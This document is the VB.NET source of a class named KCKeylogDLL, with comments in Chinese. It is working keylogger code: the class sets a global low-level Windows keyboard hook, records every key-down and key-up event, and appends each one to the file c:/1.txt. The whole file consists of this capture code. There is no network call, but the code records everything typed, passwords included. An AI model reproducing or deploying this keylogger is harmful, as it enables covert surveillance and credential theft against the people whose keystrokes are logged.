Imports System.Runtime.InteropServices
Imports System.Reflection
Imports System
Imports System.IO
Imports System.Text
Imports System.Threading
Imports System.ComponentModel
Imports System.Windows.Forms


Public Class KCKeylogDLL

    'hook-键盘钩子声明
    Public Delegate Function HOOKPROC(ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As IntPtr) As IntPtr '委托函数声明
    '启用键盘hook声明
    <DllImport("User32.dll")> _
    Private Shared Function SetWindowsHookEx(ByVal lhooktype As HOOKType, ByVal lpfn As HOOKPROC, ByVal hmod As IntPtr, ByVal dwThreadId As Integer) As IntPtr
    End Function
    '卸载键盘hook声明
    <DllImport("User32.dll")> _
    Public Shared Function UnhookWindowsHookEx(ByVal hHook As IntPtr) As Boolean
    End Function
    'hook回调传递
    <DllImport("User32.dll")> _
    Public Shared Function CallNextHookEx(ByVal hHook As IntPtr, ByVal ncode As Integer, ByVal wParam As Integer, ByVal lParam As IntPtr) As IntPtr
    End Function
    '获取当前线程句柄
    <DllImport("Kernel32")> _
    Private Shared Function GetCurrentThreadId() As Integer
    End Function

    'hook变量
    Public hnextHookproc As IntPtr = 0
    ' Public Const PM_KEY_SPACE = &H20 '空格键

    '枚举hook类型-此处为2
    Public Enum HOOKType '各种hook类型

        WH_JOURNALRECORD = 0
        WH_JOURNALPLAYBACK = 1
        WH_KEYBOARD = 2 '这个是表明Hook的种类是键盘Hook
        WH_GETMESSAGE = 3
        WH_CALLWNDPROC = 4
        WH_CBT = 5
        WH_SYSMSGFILTER = 6
        WH_MOUSE = 7
        WH_HARDWARE = 8
        WH_DEBUG = 9
        WH_SHELL = 10
        WH_FOREGROUNDIDLE = 11
        WH_CALLWNDPROCRET = 12
        WH_KEYBOARD_LL = 13
        WH_MOUSE_LL = 14
        WH_MSGFILTER = (-1)

    End Enum
    '定义键盘消息框架
    Public Structure KBDmessage

        Public vkCode As Integer   '按键代码
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer

    End Structure
    '定义键盘消息状态
    Public Enum KBDStatus
        KeyDown = &H100
        KeyUp = &H101
        SystemKeyDown = &H104
        SystemKeyUp = &H105
    End Enum
    Public Function UnHookKBD() As Boolean '解键盘HOOK函数
        Try

            If hnextHookproc <> 0 Then

                UnhookWindowsHookEx(hnextHookproc)

                hnextHookproc = 0

            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Function
    Public Function EnableKBDHook() As Boolean '设置键盘HOOK
        Try

            If hnextHookproc <> 0 Then

                Exit Function

            End If

            Dim pIntpr As IntPtr = Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly.ManifestModule)
            hnextHookproc = SetWindowsHookEx(HOOKType.WH_KEYBOARD_LL, AddressOf MyKBHFunc, pIntpr, 0)


        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Function
    '实际键盘记录处理函数
    Private Function MyKBHFunc(ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As IntPtr) As IntPtr
        Try

            '默认无消息时，回调回去，交给系统
            If nCode < 0 Then
                MyKBHFunc = CallNextHookEx(hnextHookproc, nCode, wParam, lParam)
                Exit Function
            End If
            '全局hook时，取wparam作为按键状态，检测是否按键，没检测到键盘消息时，回调回去
            '若为线程hook，则wparam为按键信息，直接匹配按键信息，进行处理
            Dim kevents As KBDStatus = wParam

            '扩展-对按键状态过滤
            If kevents <> KBDStatus.KeyDown And kevents <> KBDStatus.KeyUp And kevents <> KBDStatus.SystemKeyDown And kevents <> KBDStatus.SystemKeyUp Then
                Return CallNextHookEx(hnextHookproc, nCode, wParam, lParam)
            End If
            '通过marshal的转换，重新实例化一个键盘消息，通过获取传递过来的lparam，查看虚拟键盘码
            Dim kbdVALUE As KBDmessage = New KBDmessage
            Dim toType As Type = kbdVALUE.GetType
            kbdVALUE = Marshal.PtrToStructure(lParam, toType)
            Dim keydata As Keys = kbdVALUE.vkCode

            '传递键盘事件
            KBDfunc(kevents, keydata)

        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Function
    '自定义记录后的操作
    Private Function KBDfunc(ByVal kevents As KBDStatus, ByVal keydata As Keys) As String
        Dim keyStr As String = kevents.ToString + " " + keydata.ToString
        Try

            Dim f1 As New StreamWriter("c:/1.txt", True)
            f1.WriteLine(keyStr)
            f1.Close()
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try

        Return keyStr
    End Function







End Class
